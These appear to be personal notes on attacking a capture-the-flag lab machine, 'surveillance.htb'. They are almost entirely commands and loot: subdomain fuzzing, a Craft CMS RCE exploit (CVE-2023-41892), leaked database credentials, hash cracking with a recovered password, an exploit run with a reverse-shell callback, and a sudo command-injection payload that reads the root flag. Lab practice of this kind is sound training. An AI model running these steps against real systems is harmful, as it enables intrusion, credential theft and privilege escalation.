# ip
10.10.11.245

# wfuzz subdomains
wfuzz --hh 154 -c -w ../../SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "HOST:FUZZ.surveillance.htb" http://surveillance.htb

# rce cve-2023-41892
python3 craft-cms.py http://surveillance.htb

# etc/passwd
matthew:x:1000:1000:,,,:/home/matthew:/bin/bash
mysql:x:114:122:MySQL Server,,,:/nonexistent:/bin/false
zoneminder:x:1001:1001:,,,:/home/zoneminder:/bin/bash
fwupd-refresh:x:115:123:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false

# user
matthew
zoneminder

# version
"craftcms/cms": "4.4.14"

# hash matthew
39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec

# john command hash
john --format=raw-sha256 hash --wordlist=../../../rockyou.txt

# password matthew
starcraft122490

# ssh connection
ssh matthew@surveillance.htb -p 22

# zm file create zoneminder user
cat /etc/init.d/zoneminder

# info .env mysql
The secure key Craft will use for hashing and encrypting data
CRAFT_SECURITY_KEY=2HfILL3OAEe5X0jzYOVY5i7uUizKmB2_

# Database connection settings
CRAFT_DB_DRIVER=mysql
CRAFT_DB_SERVER=127.0.0.1
CRAFT_DB_PORT=3306
CRAFT_DB_DATABASE=craftdb
CRAFT_DB_USER=craftuser
CRAFT_DB_PASSWORD=CraftCMSPassword2023!
CRAFT_DB_SCHEMA=
CRAFT_DB_TABLE_PREFIX=

cat .env

# mysql command
mysql -u craftuser -p
use craftdb;
show databases;
show tables;
describe users;
select username, email, password, id, admin, fullName from users;

# mysql pass hash admin
admin@surveillance.htb
$2y$13$FoVGcLXXNe81B6x9bKry9OzGSSIYL7/ObcmQ0CXtgw.EpuNcx8tGe

# hashcat bcrypt
hashcat -m 3200 -a 0 hash_mysql ../../../rockyou.txt

# zm creds
cat /usr/share/zoneminder/www/api/app/Config/database.php

'datasource' => 'Database/Mysql',
                'persistent' => false,
                'host' => 'localhost',
                'login' => 'zmuser',
                'password' => 'ZoneMinderPassword2023',
                'database' => 'zm',
                'prefix' => '',
                //'encoding' => 'utf8',

# hash password zm
$2y$10$BuFy0QTupRjSWW6kEAlBCO6AlZ8ZPGDI8Xba5pi/gLr2ap86dxYd.

# connection tunnel ssh reverse zm
ssh -L 2222:127.0.0.1:8080 matthew@10.10.11.245

# connection ssh zoneminder user
python3 main.py -u http://localhost:2222 -i 10.10.14.15 -p 4444

# root flag
sudo /usr/bin/zmupdate.pl -v 1.19.0 -u ';cat /root/root.txt;'